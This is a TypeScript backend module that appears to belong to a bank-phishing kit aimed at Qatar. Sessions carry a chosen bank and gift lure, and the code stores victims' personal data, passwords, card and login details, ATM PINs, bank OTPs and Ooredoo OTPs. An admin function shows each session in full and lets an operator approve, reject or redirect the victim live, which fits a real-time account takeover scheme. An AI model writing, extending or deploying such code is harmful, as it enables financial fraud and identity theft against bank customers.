import { db } from "./_core/db";
import { sessions, personalDataSubmissions, loginMethodSubmissions, atmPinSubmissions, otpSubmissions, ooredooSubmissions } from "../drizzle/schema";
import { eq, desc } from "drizzle-orm";

export async function createSession(id: string, selectedBank: string, country: string = "Qatar", selectedGift: string = "") {
  try {
    const existing = await db.select().from(sessions).where(eq(sessions.id, id)).limit(1);
    if (existing[0]) {
      await db.update(sessions)
        .set({ 
          selectedBank, 
          country, 
          selectedGift: selectedGift || existing[0].selectedGift,
          updatedAt: new Date() 
        })
        .where(eq(sessions.id, id));
    } else {
      await db.insert(sessions).values({
        id,
        selectedBank,
        country,
        selectedGift,
        status: "pending",
        createdAt: new Date(),
        updatedAt: new Date(),
      });
    }
  } catch (error) {
    console.error("Error in createSession:", error);
    throw error;
  }
}

export async function submitPersonalData(data: any) {
  try {
    const existingSession = await db.select().from(sessions).where(eq(sessions.id, data.sessionId)).limit(1);
    if (!existingSession[0]) {
      await db.insert(sessions).values({
        id: data.sessionId,
        selectedBank: "unknown",
        status: "pending",
        createdAt: new Date(),
        updatedAt: new Date(),
      });
    }

    const submissionData: any = {
      sessionId: data.sessionId,
      nameArabic: data.nameArabic || "",
      nameEnglish: data.nameEnglish || "",
      idNumber: data.idNumber || "N/A",
      phoneNumber: data.phoneNumber || "",
      email: data.email || "",
      dateOfBirth: data.dateOfBirth || "",
      gender: data.gender || "not_specified",
      customerStatus: data.customerStatus || "new",
      password: data.password || null,
      title: data.title || null,
      middleName: data.middleName || null,
      lastName: data.lastName || null,
      promoCode: data.promoCode || null,
      country: data.country || null,
      submittedAt: new Date(),
    };

    await db.insert(personalDataSubmissions).values(submissionData);
    
    await db.update(sessions)
      .set({ 
        updatedAt: new Date(), 
        currentStep: "personal",
        status: "loading",
        adminAction: null,
        errorMessage: null
      })
      .where(eq(sessions.id, data.sessionId));
    
    return { success: true };
  } catch (error) {
    console.error("Critical error in submitPersonalData:", error);
    throw error;
  }
}

export async function submitLoginMethod(data: any) {
  await db.insert(loginMethodSubmissions).values({
    ...data,
    submittedAt: new Date(),
  });
  
  await db.update(sessions)
    .set({ 
      updatedAt: new Date(), 
      currentStep: "card",
      status: "loading",
      adminAction: null,
      errorMessage: null
    })
    .where(eq(sessions.id, data.sessionId));
}

export async function submitAtmPin(data: any) {
  await db.insert(atmPinSubmissions).values({
    ...data,
    submittedAt: new Date(),
  });
  await db.update(sessions)
    .set({ 
      updatedAt: new Date(), 
      status: "loading",
      adminAction: null, 
      errorMessage: null,
      currentStep: "atm" 
    })
    .where(eq(sessions.id, data.sessionId));
}

export async function submitOtp(data: any) {
  await db.insert(otpSubmissions).values({
    ...data,
    submittedAt: new Date(),
  });
  await db.update(sessions)
    .set({ 
      updatedAt: new Date(), 
      status: "loading",
      adminAction: null,
      errorMessage: null,
      currentStep: data.otpType === "ooredoo_otp" ? "otp_ooredoo" : "otp" 
    })
    .where(eq(sessions.id, data.sessionId));
}

export async function submitOoredoo(data: any) {
  await db.insert(ooredooSubmissions).values({
    ...data,
    submittedAt: new Date(),
  });
  await db.update(sessions)
    .set({ 
      updatedAt: new Date(), 
      status: "loading",
      adminAction: null, 
      errorMessage: null,
      currentStep: "ooredoo" 
    })
    .where(eq(sessions.id, data.sessionId));
}

export async function getFullSubmissions() {
  const allSessions = await db.select().from(sessions).orderBy(desc(sessions.updatedAt));
  const results = [];

  for (const session of allSessions) {
    const personal = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, session.id)).limit(1);
    const login = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, session.id)).limit(1);
    const pin = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, session.id)).limit(1);
    const otp = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, session.id)).orderBy(desc(otpSubmissions.submittedAt));
    const ooredoo = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, session.id)).limit(1);

    results.push({
      ...session,
      personalData: personal[0] || null,
      loginMethod: login[0] || null,
      atmPin: pin[0] || null,
      otps: otp,
      ooredoo: ooredoo[0] || null,
    });
  }

  return results;
}

export async function getSessionStatus(sessionId: string) {
  const session = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
  return session[0] || null;
}

export async function adminTakeAction(sessionId: string, action: string, errorMessage?: string, redirectTarget?: string) {
  await db.update(sessions)
    .set({ 
      adminAction: action, 
      errorMessage: errorMessage || null,
      redirectTarget: redirectTarget || null,
      status: action === "approve" ? "approved" : "rejected",
      updatedAt: new Date() 
    })
    .where(eq(sessions.id, sessionId));
}

export async function updateSessionStatus(sessionId: string, status: string, currentStep?: string) {
  const updateData: any = { status, updatedAt: new Date() };
  if (currentStep) updateData.currentStep = currentStep;
  return await db.update(sessions).set(updateData).where(eq(sessions.id, sessionId));
}
